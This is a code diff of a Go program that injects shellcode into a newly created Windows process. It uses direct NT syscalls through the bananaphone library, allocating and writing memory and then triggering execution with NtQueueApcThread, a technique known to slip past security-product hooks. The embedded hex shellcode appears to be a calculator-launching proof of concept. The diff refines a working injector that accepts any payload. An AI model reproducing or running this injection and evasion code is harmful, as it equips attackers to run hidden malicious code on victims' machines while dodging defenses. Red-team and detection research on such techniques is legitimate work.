@@ -2,7 +2,6 @@ package main
 
 import (
 	"encoding/hex"
-	"fmt"
 	"log"
 	"unsafe"
 
@@ -16,12 +15,7 @@ func setup() (uint16, uint16, uint16, uint16, uint16, uint16) {
 	if err != nil {
 		log.Fatal(err)
 	}
-	// Couldn't get the params right on this one so just create a process with windows.CreateProcess
-	// createUserProcess, err := bp.GetSysID("NtCreateUserProcess")
-	// if err != nil {
-	// 	log.Fatal(err)
-	// }
-	ntQueueApcThread, err := bp.GetSysID("NtQueueApcThread")
+	queueApcThread, err := bp.GetSysID("NtQueueApcThread")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -46,14 +40,14 @@ func setup() (uint16, uint16, uint16, uint16, uint16, uint16) {
 		log.Fatal(err)
 	}
 
-	return ntQueueApcThread, protectVirtMemId, writeVirtMem, allocateVirtMem, resumeThread, closeHandle
+	return queueApcThread, protectVirtMemId, writeVirtMem, allocateVirtMem, resumeThread, closeHandle
 }
 
 func inject(ntQueueApcThread uint16, ntProtectVirtualMemory uint16, ntWriteVirtualMemory uint16, ntAllocateVirtualMemory uint16,
 	ntResumeThread uint16, ntClose uint16) {
 	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
 	if errShellcode != nil {
-		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
+		log.Fatalf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error())
 	}
 
 	si := &windows.StartupInfo{}
@@ -68,6 +62,7 @@ func inject(ntQueueApcThread uint16, ntProtectVirtualMemory uint16, ntWriteVirtu
 	if err != nil && err.Error() != "The operation completed successfully." {
 		log.Fatalf("[-] Failed to create process. Return code is %s\n", err.Error())
 	}
+
 	var bAddr uintptr
 	regionSize := len(shellcode)
 
@@ -92,7 +87,6 @@ func inject(ntQueueApcThread uint16, ntProtectVirtualMemory uint16, ntWriteVirtu
 		uintptr(unsafe.Pointer(&shellcode[0])),
 		uintptr(regionSize),
 		uintptr(unsafe.Pointer(&numberOfBytesWritten)),
-		0,
 	)
 	if err != nil {
 		log.Fatalf("[-] Failed to write memory. Return code is %x\n", ret)
@@ -134,33 +128,22 @@ func inject(ntQueueApcThread uint16, ntProtectVirtualMemory uint16, ntWriteVirtu
 		log.Fatalf("[-] Failed to resume thread. Return code is %x\n", ret)
 		return
 	}
-	// close handles
-	err = windows.CloseHandle(pi.Process)
+
+	ret, err = bananaphone.Syscall(ntClose,
+		uintptr(pi.Process),
+	)
 	if err != nil {
-		log.Fatalf("[-] Failed to close handle to process. Return error %x\n", err.Error())
+		log.Fatalf("[-] Failed to close handle to process. Return code is %x\n", ret)
 		return
 	}
-	err = windows.CloseHandle(pi.Thread)
+
+	ret, err = bananaphone.Syscall(ntClose,
+		uintptr(pi.Thread),
+	)
 	if err != nil {
-		log.Fatalf("[-] Failed to close handle to process. Return error %s\n", err.Error())
+		log.Fatalf("[-] Failed to close handle to thread. Return code is %x\n", ret)
+		return
 	}
-
-	// ntClose issues. Not sure why
-	// ret, err = bananaphone.Syscall(ntClose,
-	// 	uintptr(pi.Process),
-	// )
-	// if err != nil {
-	// 	log.Fatalf("[-] Failed to close handle to process. Return code is %x\n", ret)
-	// 	return
-	// }
-
-	// ret, err = bananaphone.Syscall(ntClose,
-	// 	uintptr(pi.Thread),
-	// )
-	// if err != nil {
-	// 	log.Fatalf("[-] Failed to close handle to thread. Return code is %x\n", ret)
-	// 	return
-	// }
 }
 
 func main() {
